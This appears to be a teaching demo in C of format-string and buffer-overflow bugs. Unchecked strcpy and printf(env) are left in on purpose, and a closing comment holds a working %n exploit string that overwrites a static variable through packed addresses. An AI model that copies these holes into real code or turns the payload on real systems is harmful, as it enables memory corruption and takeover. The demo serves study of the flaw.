#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
  char buffer[64];
  static int value = 50;

  if (argc != 2) {
    return -1;
  }

  strcpy(buffer, argv[1]);

  printf("Right way:\n");
  printf("%s\n", buffer);

  printf("Wrong way:\n");
  char *env = getenv("FMT");
  printf(env);

  printf("\n");

  printf("(-) value @0x%08x = %d 0x%08x\n", &value, value, value);
  return 0;
}

/* ./fmt_bug `printf "\x14\x98\x04\x08\x15\x98\x04\x08\x16\x98\x04\x08\x17\x98\x04\x08"`%4\$12x%4\$n%4\$224x%5\$n\%4\$259x%6\$n%4\$192x%7\$n */

  
